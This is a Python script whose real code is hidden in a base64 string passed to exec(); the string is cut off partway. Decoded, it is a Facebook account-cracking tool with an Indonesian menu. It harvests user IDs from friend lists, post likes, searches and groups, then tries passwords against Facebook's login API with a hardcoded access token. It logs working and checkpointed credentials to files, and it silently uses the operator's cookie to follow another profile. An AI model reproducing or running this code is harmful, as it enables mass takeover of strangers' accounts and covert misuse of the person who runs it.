#Mau recode bro?
#Ku pecahkan pler bapak kao
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQojSmFuZ2FuIERpIHJlY29kZSBiYW5nIHNheWEganVnYSBtYXNpaCBwZW11bGEKI1Rvb2xzIHVwZGF0ZSAyOS0wOS0yMDIwCmltcG9ydCBvcyxzeXMscmUsdGltZSxqc29uLHJhbmRvbSxyZXF1ZXN0cwpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXIKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgoKZGVmIGNsZWFyKCk6CiAgICBvcy5zeXN0ZW0oImNsZWFyIikKCmRlZiBrYXRhKHMpOgogICAgZm9yIGMgaW4gcyArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMS4vMzAwKQoKZGVmIGJhbGlrKCk6CiAgICBmPWlucHV0KCJcMDMzWzAwbVx0W1wwMzNbOTZtVGVrYW4gZW50ZXIgdW50dWsga2VsdWFyXDAzM1swMG1dIikKICAgIGlmIGYgPT0gIiI6CiAgICAgICBvcy5zeXN0ZW0oInB5dGhvbiBDb250b2gucHkiKQogICAgZWxzZToKICAgICAgIHN5cy5leGl0KCJcMDMzWzE7OTFtS2VsdWFyXDAzM1swMG0iKQoKZGVmIGJhbmVyKCk6CiAgICB0aW1lLnNsZWVwKDAuMSkKICAgIGthdGEoIiIiXG5cdFwwMzNbOTBtfiAgfiAgflwwMzNbOTJt4pSM4oip4pSQXDAzM1s5NG0oXDAzM1s5MW3il6Nf4peiXDAzM1s5NG0pXDAzM1s5Mm3ilIziiKnilJBcMDMzWzkwbX4gIH4gIH4KXHRcMDMzWzAwbSAgIENSQUNLIEFLVU4gRkFDRUJPT0sgClx0XDAzM1s5MG0gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzk0bVxuClwwMzNbMTs5MW3ilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcg4paI4paI4pWXICDilojilojilZcg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZcKXDAzM1sxOzkxbeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWRIOKWiOKWiOKVlOKVnQpcMDMzWzE7OTZt4paI4paI4pWRICAgICDilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZHilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAKXDAzM1sxOzk2beKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZTilZDilojilojilZcgClwwMzNbMTs5M23ilZrilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAg4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZcKXDAzM1sxOzkzbSDilZrilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdClwwMzNbOTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swMG0KXDAzM1sxOzkzbUF1dGhvciAgICBcMDMzWzE7OTFtOiBcMDMzWzE7OTZtWWF5YW5YRFwwMzNbMDBtClwwMzNbMTs5M21HaXRodWIgICAgXDAzM1sxOzkxbTogXDAzM1sxOzk2bWdpdGh1Yi5jb20vWWF5YW4tWERcMDMzWzAwbQpcMDMzWzE7OTNtSW5zdGFncmFtIFwwMzNbMTs5MW06IFwwMzNbMTs5Nm1AeWF5YW54ZF9cMDMzWzAwbQpcMDMzWzk0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMDBtIiIiKQoKZGVmIGNyYWNrKCk6CiAgICB0aW1lLnNsZWVwKDAuMSkKICAgIHByaW50KCJcMDMzWzAwbVtcMDMzWzkzbTFcMDMzWzAwbV0gTXVsYWkgQ3JhY2sgU2VtdWEgSUQiKQogICAgcHJpbnQoIlwwMzNbMDBtW1wwMzNbOTNtMlwwMzNbMDBtXSBDcmFjayBNYWlsIE5vIExvZ2luIikKICAgIHByaW50KCJcMDMzWzAwbVtcMDMzWzkzbTNcMDMzWzAwbV0gVXBkYXRlIikKICAgIHByaW50KCJcMDMzWzAwbVtcMDMzWzkzbTRcMDMzWzAwbV0gRXhpdCIpCiAgICB0aW1lLnNsZWVwKDAuMSkKICAgIGY9aW5wdXQoIlxuXDAzM1s5MG1QaWxpaCBOb21vciBcMDMzWzE7OTNtIikKICAgIGlmIGYgPT0gIjEiOgogICAgICAgICBwcmludCgiXDAzM1sxOzk0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMDBtIikKICAgICAgICAgbWJhc2ljID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbXt9JwogICAgICAgICBnbG9iYWwgZGllLGNoZWNrLHJlc3VsdCwgY291bnQKICAgICAgICAgaWQgPSBbXQogICAgICAgICBkaWUgPSAwCiAgICAgICAgIGNoZWsgPSBbXQogICAgICAgICBsaWZlID0gW10KICAgICAgICAgY291bnQgPSAwCiAgICAgICAgIGNoZWNrID0gMAogICAgICAgICByZXN1bHQgPSAwCiAgICAgICAgIGRlZiBtYXN1aygpOgogICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oImNvb2tpZXMiKS5yZWFkKCkKICAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgICAgICBjZWsgPSBpbnB1dCgiXDAzM1s5MG0+IFwwMzNbMDBtQ29vb2tpZXMgOiBcMDMzWzE7OTJtIikKICAgICAgICAgICAgIGNlayA9IHsiY29va2llIjpjZWt9CiAgICAgICAgICAgICBpc21pID0gc2VzLmdldChtYmFzaWMuZm9ybWF0KCIvbWUiLHZlcmlmeT1GYWxzZSksY29va2llcz1jZWspLmNvbnRlbnQKICAgICAgICAgICAgIGlmICJtYmFzaWNfbG9nb3V0X2J1dHRvbiIgaW4gc3RyKGlzbWkpOgogICAgICAgICAgICAgICAgICAgICBpZiAiQXBhIHlhbmcgQW5kYSBwaWtpcmthbiBzZWthcmFuZyIgaW4gc3RyKGlzbWkpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigiY29va2llcyIsInciKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShjZWtbImNvb2tpZSJdKQogICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1s5MG0+IFwwMzNbMDBtVWJhaCBiYWhhc2EsIGhhcmFwIHR1bmdndVwwMzNbMTs5MW0hIVwwMzNbMDBtIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQocGFyc2VyKGlzbWksImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJCYWhhc2EgSW5kb25lc2lhIilbImhyZWYiXSksY29va2llcz1jZWspCiAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlrdXRpID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KCIveHpjb2Rlci54emNvZGVyIiksY29va2llcz1jZWspLmNvbnRlbnQsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJJa3V0aSIpWyJocmVmIl0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoaWt1dGkpLGNvb2tpZXM9Y2VrKQogICAgICAgICAgICAgICAgICAgICBleGNlcHQgOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGNla1siY29va2llIl0KICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIGV4aXQoIlwwMzNbMDBtW1wwMzNbOTFtIVwwMzNbMDBtXVwwMzNbMDBtQ29va2llcyBBbmRhIFwwMzNbMTs5MW1zYWxhaFwwMzNbMDBtIikKICAgICAgICAgICAgICAgICAgYmFsaWsoKQogICAgICAgICBkZWYgbG9naW4odXNlcm5hbWUscGFzc3dvcmQsY2VrPUZhbHNlKToKICAgICAgICAgICAgIGdsb2JhbCBkaWUsY2hlY2sscmVzdWx0LGNvdW50CiAgICAgICAgICAgICBiID0gIjM1MDY4NTUzMTcyOCU3QzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyIgogICAgICAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogYiwKICAgICAgICAgICAgICAgICAgICAgJ2Zvcm1hdCc6ICdKU09OJywKICAgICAgICAgICAgICAgICAgICAgJ3Nka192ZXJzaW9uJzogJzInLAogICAgICAgICAgICAgICAgICAgICAnZW1haWwnOiB1c2VybmFtZSwKICAgICAgICAgICAgICAgICAgICAgJ2xvY2FsZSc6ICdlbl9VUycsCiAgICAgICAgICAgICAgICAgICAgICdwYXNzd29yZCc6IHBhc3N3b3JkLAogICAgICAgICAgICAgICAgICAgICAnc2RrJzogJ2lvcycsCiAgICAgICAgICAgICAgICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsCiAgICAgICAgICAgICAgICAgICAgICdzaWcnOiAnM2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnLAogICAgICAgICAgICAgfQogICAgICAgICAgICAgYXBpID0gJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luJwogICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoYXBpLCBwYXJhbXM9cGFyYW1zKQogICAgICAgICAgICAgaWYgJ0VBQScgaW4gcmVzcG9uc2UudGV4dDoKICAgICAgICAgICAgICAgICBwcmludChmIlxyXDAzM1swMG1bXDAzM1sxOzMybeKck1wwMzNbMDBtXSBcMDMzWzE7MzJte3VzZXJuYW1lfSBcMDMzWzkwbT0+IFwwMzNbMTszMm17cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikKICAgICAgICAgICAgICAgICBwcmludCgpCiAgICAgICAgICAgICAgICAgcmVzdWx0ICs9IDEKICAgICAgICAgICAgICAgICBpZiBjZWs6CiAgICAgICAgICAgICAgICAgICAgICAgIGxpZmUuYXBwZW5kKHVzZXJuYW1lKyJ8IitwYXNzd29yZCkKICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtbGlmZS50eHQnLCdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHVzZXJuYW1lICsgJ3wnICsgcGFzc3dvcmQgKyAnXG4nKQogICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVzcG9uc2UuanNvbigpWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJcMDMzWzAwbVtcMDMzWzE7OTFteFwwMzNbMDBtXSBcMDMzWzE7MzNte3VzZXJuYW1lfSBcMDMzWzkwbT0+IFwwMzNbMTszM217cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikKICAgICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgICAgIGNoZWNrICs9IDEKICAgICAgICAgICAgICAgICAgIGlmIGNlazoKICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hlay5hcHBlbmQodXNlcm5hbWUrInwiK3Bhc3N3b3JkKQogICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWNoZWNrLnR4dCcsJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpCiAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgZGllICs9IDEKICAgICAgICAgICAgIGZvciBpIGluIGxpc3QoJ1x8Ly3igKInKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJcMDMzWzAwbVtcMDMzWzE7OTFte2l9XDAzM1swMG1dIExpZmUgOiBcMDMzWzkwbShcMDMzWzE7OTJte3N0cihyZXN1bHQpfVwwMzNbOTBtKSBcMDMzWzAwbWNoZWNrcG9pbnQgOiBcMDMzWzkwbShcMDMzWzE7OTNte3N0cihjaGVjayl9XDAzM1s5MG0pIFwwMzNbMDBtZGllIDogXDAzM1s5MG0oXDAzM1sxOzkxbXtzdHIoZGllKX1cMDMzWzkwbSlcMDMzWzAwbSIsZW5kPSIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjIpCiAgICAgICAgIGRlZiBnZXRpZCh1cmwpOgogICAgICAgICAgICAgcmF3ID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQKICAgICAgICAgICAgIGdldHVzZXIgPSByZS5maW5kYWxsKCdtaWRkbGUiPjxhIGNsYXNzPSIuLiIgaHJlZj0iKC4qPykiPiguKj8pPC9hPicsc3RyKHJhdykpCiAgICAgICAgICAgICBmb3IgeCBpbiBnZXR1c2VyOgogICAgICAgICAgICAgICAgIGlmICdwcm9maWxlJyBpbiB4WzBdOgogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHJlLmZpbmRhbGwoIj0oXGQqKT8iLHN0cih4WzBdKSlbMF0pCiAgICAgICAgICAgICAgICAgZWxpZiAnZnJpZW5kcycgaW4geDoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHhbMF0uc3BsaXQoJy8nKVsxXS5zcGxpdCgnPycpWzBdKQogICAgICAgICAgICAgICAgIHByaW50KCdcclwwMzNbOTBtPiBcMDMzWzE7OTZtJyArIHN0cihsZW4oaWQpKSArICIgXDAzM1swMG1yZXRyaWV2ZWQiLGVuZD0iIikKICAgICAgICAgICAgIGlmICdMaWhhdCBUZW1hbiBMYWluJyBpbiBzdHIocmF3KToKICAgICAgICAgICAgICAgICBnZXRpZChtYmFzaWMuZm9ybWF0KHBhcnNlcihyYXcsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSdMaWhhdCBUZW1hbiBMYWluJylbJ2hyZWYnXSkpCiAgICAgICAgICAgICByZXR1cm4gaWQKICAgICAgICAgZGVmIGZyb21saWtlcyh1cmwpOgogICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICBsaWtlID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQKICAgICAgICAgICAgICAgICAgbG92ZSA9IHJlLmZpbmRhbGwoJ2hyZWY9IigvdWZpLio/KSInLHN0cihsaWtlKSlbMF0KICAgICAgICAgICAgICAgICAgYXdzID0gZ2V0bGlrZShtYmFzaWMuZm9ybWF0KGxvdmUpKQogICAgICAgICAgICAgICAgICByZXR1cm4gYXdzCiAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgIGV4aXQoIlwwMzNbOTBtPiBcMDMzWzE7OTFtY2FudCBkdW1wIGlkXDAzM1swMG0gIikKICAgICAgICAgZGVmIGdldGxpa2UocmVhY3QpOgogICAgICAgICAgICAgbGlrZSA9IHJlcXVlc3RzLmdldChyZWFjdCxjb29raWVzPWt1a2kpLmNvbnRlbnQKICAgICAgICAgICAgIGlkcyAgPSByZS5maW5kYWxsKCdjbGFzcz0iYi4iPjxhIGhyZWY9IiguKj8pIj4oLio/KTwvYT48L2gzPicsc3RyKGxpa2UpKQogICAgICAgICAgICAgZm9yIHVzZXIgaW4gaWRzOgogICAgICAgICAgICAgICAgIGlmICdwcm9maWxlJyBpbiB1c2VyWzBdOgogICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCI9KFxkKikiLHN0cih1c2VyWzBdKSlbMF0pCiAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXS5zcGxpdCgnLycpWzFdKQogICAgICAgICAgICAgICAgIHByaW50KGYnXHJcMDMzWzkwbSBcMDMzWzE7OTZte3N0cihsZW4oaWQpKX0gXDAzM1swMG1yZXRyaWV2ZWQnLGVuZD0iIikKICAgICAgICAgICAgIGlmICdMaWhhdCBTZWxlbmdrYXBueWEnIGluIHN0cihsaWtlKToKICAgICAgICAgICAgICAgICBnZXRsaWtlKG1iYXNpYy5mb3JtYXQocGFyc2VyKGxpa2UsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkKICAgICAgICAgICAgIHJldHVybiBpZAogICAgICAgICBkZWYgYnlzZWFyY2gob3B0aW9uKToKICAgICAgICAgICAgIHNlYXJjaCA9IHJlcXVlc3RzLmdldChvcHRpb24sY29va2llcz1rdWtpKS5jb250ZW50CiAgICAgICAgICAgICB1c2VycyA9IHJlLmZpbmRhbGwoJ2NsYXNzPSJ4IGNoIj48YSBocmVmPSIvKC4qPykiPjxkaXYuKj9jbGFzcz0iY2oiPiguKj8pPC9kaXY+JyxzdHIoc2VhcmNoKSkKICAgICAgICAgICAgIGZvciB1c2VyIGluIHVzZXJzOgogICAgICAgICAgICAgICAgICBpZiAicHJvZmlsZSIgaW4gdXNlclswXToKICAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgcmUuZmluZGFsbCgiPShcZCopIixzdHIodXNlclswXSkpWzBdKQogICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyB1c2VyWzBdLnNwbGl0KCI/IilbMF0pCiAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJcMDMzWzkwbT4gXDAzM1sxOzk2bXtzdHIobGVuKGlkKSl9IFwwMzNbMDBtcmV0cmlldmVkICIsZW5kPSIiKQogICAgICAgICAgICAgaWYgIkxpaGF0IEhhc2lsIFNlbGFuanV0bnlhIiBpbiBzdHIoc2VhcmNoKToKICAgICAgICAgICAgICAgICAgYnlzZWFyY2gocGFyc2VyKHNlYXJjaCwnaHRtbC5wYXJzZXInKS5maW5kKCJhIixzdHJpbmc9IkxpaGF0IEhhc2lsIFNlbGFuanV0bnlhIilbImhyZWYiXSkKICAgICAgICAgICAgIHJldHVybiBpZAogICAgICAgICBkZWYgZ3J1YmlkKGVuZHBvaW50KToKICAgICAgICAgICAgIGdyYWIgPSByZXF1ZXN0cy5nZXQoZW5kcG9pbnQsY29va2llcz1rdWtpKS5jb250ZW50CiAgICAgICAgICAgICB1c2VycyA9IHJlLmZpbmRhbGwoJ2EgY2xhc3M9Ii4uIiBocmVmPSIvKC4qPykiPiguKj8pPC9hPicsc3RyKGdyYWIpKQogICAgICAgICAgICAgZm9yIHVzZXIgaW4gdXNlcnM6CiAgICAgICAgICAgICAgICAgaWYgInByb2ZpbGUiIGluIHVzZXJbMF06CiAgICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoJ2lkPShcZCopJyxzdHIodXNlclswXSkpWzBdKQogICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHVzZXJbMF0pCiAgICAgICAgICAgICAgICAgcHJpbnQoZiJcclwwMzNbOTBtPiBcMDMzWzE7OTZte3N0cihsZW4oaWQpKX0gXDAzM1swMG1yZXRyaWV2ZWQgIixlbmQ9IiIpCiAgICAgICAgICAgICBpZiAiTGloYXQgU2VsZW5na2FwbnlhIiBpbiBzdHIoZ3JhYik6CiAgICAgICAgICAgICAgICAgZ3J1YmlkKG1iYXNpYy5mb3JtYXQocGFyc2VyKGdyYWIsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkKICAgICAgICAgICAgIHJldHVybiBpZAogICAgICAgICBpZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgICAgICAgICAgICAgICAgIGt1a2lzID0gbWFzdWsoKQogICAgICAgICAgICAgICAgICAga3VraSA9IHsnY29va2llJzprdWtpc30KICAgICAgICAgICAgICAgICAgIGNsZWFyKCkKICAgICAgICAgICAgICAgICAgIGJhbmVyKCkKICAgICAgICAgICAgICAgICAgIGthdGEoJ1wwMzNbOTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbVxuJykKICAgICAgICAgICAgICAgICAgIGthdGEoJ1wwMzNbMTs5N21bXDAzM1sxOzkzbTFcMDMzWzE7OTdtXSBcMDMzWzAwbUNyYWNrIERhZnRhciBUZW1hbicpCiAgICAgICAgICAgICAgICAgICBrYXRhKCdcMDMzWzE7OTdtW1wwMzNbMTs5M20yXDAzM1sxOzk3bV0gXDAzM1swMG1DcmFjayBEYXJpIExpa2UgUG9zdFwwMzNbMTs5N20gJykKICAgICAgICAgICAgICAgICAgIGthdGEoJ1wwMzNbMTs5N21bXDAzM1sxOzkzbTNcMDMzWzE7OTdtXSBcMDMzWzAwbUNyYWNrIERhcmkgUGVuY2FyaWFuIE5hbWEnKQogICAgICAgICAgICAgICAgICAga2F0YSgnXDAzM1sxOzk3bVtcMDMzWzE7OTNtNFwwMzNbMTs5N21dIFwwMzNbMDBtQ3JhY2sgRGFyaSBHcnVwICcpCiAgICAgICAgICAgICAgICAgICBrYXRhKCdcMDMzWzE7OTdtW1wwMzNbMTs5M201XDAzM1sxOzk3bV0gXDAzM1swMG1DcmFjayBEYXJpIFRlbWFuJykKICAgICAgICAgICAgICAgICAgIGthdGEoJ1wwMzNbMTs5N21bXDAzM1sxOzkzbTZcMDMzWzE7OTdtXSBcMDMzWzAwbUxpaGF0IEhhc2lsIENyYWNrJykKICAgICAgICAgICAgICAgICAgIGthdGEoJ1wwMzNbOTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbVxuJykKICAgICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgICAgIHRhbnlhID0gaW5wdXQoJ1wwMzNbOTBtUGlsaWggTm9tb3JcMDMzWzE7OTNtICcpCiAgICAgICAgICAgICAgICAgICBpZiB0YW55YSA9PSIiOgogICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiXDAzM1swMG1bXDAzM1s5MW0hXDAzM1swMG1dIEphbmdhbiBrb3NvbmciKQogICAgICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMSc6CiAgICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBwYXJzZXIoc2VzLmdldChtYmFzaWMuZm9ybWF0KCcvbWUnKSxjb29raWVzPWt1a2kpLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSdUZW1hbicpCiAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXJsWyJocmVmIl0pKQogICAgICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMic6CiAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGlucHV0KCJcMDMzWzkwbT4gXDAzM1swMG1VUkwgUG9zdCA6IFwwMzNbMTs5Mm0iKQogICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXNlcm5hbWUgPT0gIiI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIlwwMzNbMDBtW1wwMzNbOTFtIVwwMzNbMDBtXSBUaWRhayBib2xlaCBrb3NvbmciKQogICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rJyBpbiB1c2VybmFtZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VybmFtZS5yZXBsYWNlKCd3d3cuZmFjZWJvb2snLCdtYmFzaWMuZmFjZWJvb2snKQogICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnbS5mYWNlYm9vay5jb20nIGluIHVzZXJuYW1lOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ20uZmFjZWJvb2suY29tJywnbWJhc2ljLmZhY2Vib29rLmNvbScpCiAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGZyb21saWtlcyh1c2VybmFtZSkKICAgICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzMnOgogICAgICAgICAgICAgICAgICAgICAgICAga25mID0gaW5wdXQoIlwwMzNbOTBtPiBcMDMzWzAwbXBlcnRhbnlhYW4gOiBcMDMzWzE7OTJtIikKICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gYnlzZWFyY2gobWJhc2ljLmZvcm1hdCgnL3NlYXJjaC9wZW9wbGUvP3E9JytrbmYpKQogICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHVzZXJuYW1lKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcMDMzWzkwbVtcMDMzWzkxbSFcMDMzWzAwbV0gdGlkYWsgYWRhIGhhc2lsIikKICAgICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzQnOgogICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbOTBtPiBcMDMzWzAwbWNhbiBvbmx5IHRha2UgXDAzM1s5MW0xMDAgXDAzM1swMG1JRHMgIikKICAgICAgICAgICAgICAgICAgICAgICAgIGdyYWIgPSBpbnB1dCgiXDAzM1s5MG0+IFwwMzNbMDBtSUQgZ3JvdXAgOiBcMDMzWzE7OTJtIikKICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gZ3J1YmlkKG1iYXNpYy5mb3JtYXQoIi9icm93c2UvZ3JvdXAvbWVtYmVycy8/aWQ9IiArIGdyYWIpKQogICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHVzZXJuYW1lKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcMDMzWzAwbVtcMDMzWzkxbSFcMDMzWzAwbV1JRCBzYWxhaCIpC